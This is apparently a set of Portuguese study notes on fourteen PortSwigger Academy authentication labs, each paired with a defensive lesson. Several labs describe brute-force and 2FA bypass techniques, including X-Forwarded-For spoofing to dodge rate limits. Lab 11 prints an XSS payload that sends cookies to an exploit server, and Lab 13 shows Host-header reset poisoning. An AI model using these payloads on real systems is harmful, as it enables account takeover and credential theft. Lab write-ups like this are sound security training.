# Authentication Vulnerabilities

**Plataforma:** PortSwigger Web Security Academy  
**Módulo:** Authentication  
**Labs:** 14 concluídos  
**Contexto:** Atividade de mentoria em segurança ofensiva web

---

## Conceito base

**Authentication** é verificar a identidade de um usuário. Diferente de **Authorization**, que define o que ele pode fazer após autenticado.

A maioria das falhas vem de:
- Lógica mal implementada
- Falta de rate limiting
- Mensagens de erro reveladoras
- Tokens previsíveis em reset de senha e 2FA
- Confiança em dados controlados pelo cliente

---

## Brute Force e Enumeração

### Lab 1 — Username enumeration via different responses
`Apprentice` `Intruder · Sniper`

**Vulnerabilidade:** Mensagens distintas — `Invalid username` vs `Incorrect password` — revelam se o usuário existe.

**Técnica:**
1. Capturar POST `/login` no Burp → Intruder (Sniper) no campo `username`
2. Wordlist de usernames → filtrar resposta sem `Invalid username`
3. Repetir com `password` usando o username confirmado → 302 = senha correta

**Lição:** Mensagem de erro deve ser idêntica independente do campo errado.

---

### Lab 2 — Username enumeration via subtly different responses
`Practitioner` `Intruder · Sniper` `Grep Extract`

**Vulnerabilidade:** Diferença de 1 caractere na mensagem (ponto final ausente) indica usuário válido.

**Técnica:**
1. Intruder Sniper no campo `username`
2. Grep - Extract: capturar texto exato da mensagem de erro
3. Mensagem levemente diferente = username válido
4. Repetir com senha

**Lição:** A resposta deve ser byte-a-byte idêntica em qualquer falha.

---

### Lab 3 — Username enumeration via response timing
`Practitioner` `Intruder · Pitchfork` `X-Forwarded-For`

**Vulnerabilidade:** Servidor demora mais quando username existe (computa hash da senha). Rate limiting por IP bypassado com `X-Forwarded-For`.

**Técnica:**
1. Adicionar `X-Forwarded-For` com valor variável à requisição
2. Pitchfork: lista 1 = IPs incrementais, lista 2 = usernames
3. Senha longa (100+ chars) amplifica diferença de tempo
4. Tempo alto em "Response received" = username válido

---

### Lab 4 — Broken brute-force protection: IP block
`Practitioner` `Intruder · Pitchfork`

**Vulnerabilidade:** Contador reseta após login bem-sucedido. Intercalar logins válidos entre tentativas no alvo impede o bloqueio.

**Estrutura das listas:**
```
usernames.txt    passwords.txt
wiener           peter
carlos           123456
wiener           peter
carlos           password
```
Cada login de `wiener:peter` reseta o contador antes da tentativa em `carlos`.

---

### Lab 5 — Username enumeration via account lock
`Practitioner` `Intruder · Cluster Bomb`

**Vulnerabilidade:** O bloqueio de conta confirma que o usuário existe — contas inexistentes nunca são bloqueadas.

**Técnica:**
1. Repetir cada username 5+ vezes com senhas aleatórias
2. Resposta `too many incorrect login attempts` = usuário válido
3. Brute force de senha: resposta sem mensagem de erro = acesso

---

### Lab 6 — Broken brute-force protection: multiple credentials per request
`Expert` `Repeater · JSON array`

**Vulnerabilidade:** API aceita `password` como array — uma requisição, todas as senhas da wordlist.

```json
{
    "username": "carlos",
    "password": ["123456", "password", "qwerty", "..."]
}
```

---

## Multi-Factor Authentication (2FA)

### Lab 7 — 2FA simple bypass
`Apprentice` `Navegação direta`

**Vulnerabilidade:** Sessão autenticada criada após o primeiro fator. Acessar `/my-account` diretamente ignora o 2FA.

**Técnica:**
1. Login com credenciais de carlos
2. Quando redirecionado para `/login2`, não inserir código
3. Navegar diretamente para `/my-account` → acesso concedido

**Lição:** Segundo fator deve ser verificado antes de liberar qualquer recurso autenticado.

---

### Lab 8 — 2FA broken logic
`Practitioner` `Intruder · Sniper` `Cookie manipulation`

**Vulnerabilidade:** Cookie `account=wiener` na verificação do 2FA pode ser alterado para `account=carlos`.

**Técnica:**
1. Login com wiener, capturar fluxo do 2FA
2. Alterar cookie para `account=carlos` na requisição GET `/login2`
3. Intruder Sniper no código com `account=carlos` fixo
4. Brute force 0000–9999, filtrar por 302

**Lição:** O servidor deve validar que sessão e conta pertencem ao mesmo usuário.

---

### Lab 9 — 2FA bypass using a brute-force attack
`Expert` `Intruder · Sniper` `Burp Macros`

**Vulnerabilidade:** Sessão invalidada após tentativas, mas sem bloqueio real. Macro reautentica antes de cada tentativa.

**Técnica:**
1. Macro: `GET /login` → `POST /login` (carlos) → `GET /login2`
2. Session Handling Rule: executar macro antes de cada requisição do Intruder
3. Sniper no código (0000–9999), filtrar por 302

---

## Outros Mecanismos de Autenticação

### Lab 10 — Brute-forcing a stay-logged-in cookie
`Practitioner` `Intruder · Sniper` `Payload Processing`

**Vulnerabilidade:** Cookie previsível: `base64(username:md5(password))`

**Análise:**
```
Cookie decode:  wiener:51dc30ddc473d43a6011e9ebf052eae7
MD5 crack:      51dc30ddc... = "password"
Padrão:         base64(username:md5(password))
```

**Pipeline Payload Processing:**
1. Hash: MD5 → 2. Prefix: `carlos:` → 3. Encode: Base64

---

### Lab 11 — Offline password cracking
`Practitioner` `XSS` `Cookie theft` `Hash cracking`

**Técnica:**
1. Injetar XSS no comentário:
```html
<script>document.location='//exploit-server/'+document.cookie</script>
```
2. Capturar cookie de carlos nos logs do exploit server
3. Base64 decode → MD5 → crackear via CrackStation
4. Login com credenciais → deletar conta de carlos

---

### Lab 12 — Password reset broken logic
`Apprentice` `Repeater · Parameter tampering`

**Vulnerabilidade:** Campo `username` no POST de reset não validado contra o token.

**Técnica:**
1. Solicitar reset para wiener, capturar token
2. Interceptar requisição de mudança de senha
3. Alterar `username=wiener` → `username=carlos` → enviar

**Lição:** Token de reset deve estar vinculado ao usuário no servidor, nunca em campo do formulário.

---

### Lab 13 — Password reset poisoning via middleware
`Practitioner` `Repeater · Host header injection`

**Vulnerabilidade:** Servidor usa `X-Forwarded-Host` para construir o link de reset.

**Técnica:**
1. Solicitar reset para carlos
2. Interceptar no Burp, adicionar:
```
X-Forwarded-Host: exploit-server.net
```
3. Token capturado nos logs → usar na URL real para redefinir senha

---

### Lab 14 — Password brute-force via password change
`Practitioner` `Intruder · Sniper` `Error oracle`

**Vulnerabilidade:** Funcionalidade de troca de senha sem rate limiting, com respostas distintas por estado.

| Senha atual | Novas senhas | Resposta |
|---|---|---|
| Correta | Iguais | Sucesso |
| Correta | Diferentes | `New passwords do not match` |
| Incorreta | Diferentes | `Current password is incorrect` |

A mensagem `New passwords do not match` é o oráculo: confirma senha atual correta sem gerar bloqueio.

---

## Lições aprendidas

| Falha | Mitigação |
|---|---|
| Mensagens de erro distintas | Resposta genérica idêntica para qualquer falha |
| Sem rate limiting | Bloqueio progressivo por conta + CAPTCHA |
| 2FA com lógica quebrada | Vincular código ao token de sessão no servidor |
| Token de reset não vinculado ao usuário | Binding servidor-side: token ↔ usuário ↔ tempo |
| Cookie previsível | Tokens opacos e aleatórios, sem dados codificados |
| Host header confiável | Nunca usar headers do cliente para gerar URLs |

---
